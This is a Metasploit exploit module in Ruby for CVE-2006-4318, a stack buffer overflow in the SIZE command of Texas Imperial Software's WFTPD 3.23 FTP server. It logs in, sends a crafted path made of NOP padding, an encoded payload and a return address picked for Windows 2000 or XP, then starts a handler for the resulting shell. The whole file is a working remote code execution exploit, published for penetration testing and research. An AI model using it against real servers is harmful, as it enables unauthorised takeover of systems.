##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Texas Imperial Software WFTPD 3.23 SIZE Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in the SIZE verb in
        Texas Imperial's Software WFTPD 3.23.
      },
      'Author'         => 'MC',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2006-4318' ],
          [ 'OSVDB', '28134' ],
          [ 'BID', '19617' ],
        ],
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'    => 500,
          'BadChars' => "\x00\x20\x0a\x0d",
          'StackAdjustment' => -3500,
        },
      'Platform' 		  => 'win',
      'Targets'        =>
        [
          [ 'Windows 2000 Pro SP4 English',			{ 'Ret' => 0x7c2d3028 } ],
          [ 'Windows XP Pro SP1 English',				{ 'Ret' => 0x77dd1595 } ],
          [ 'Windows XP Pro SP2 English',           { 'Ret' => 0x77d498ec } ],
        ],
      'DisclosureDate' => '2006-08-23',
      'DefaultTarget' => 0))
  end

  def exploit
    c = connect_login
    return if not c

    sploit =  "/" + make_nops(525 - payload.encoded.length)
    sploit << payload.encoded + [target.ret].pack('V')

    print_status("Trying target #{target.name}...")

    send_cmd(['SIZE', sploit], false)
    select(nil,nil,nil,2)

    handler
    disconnect
  end
end
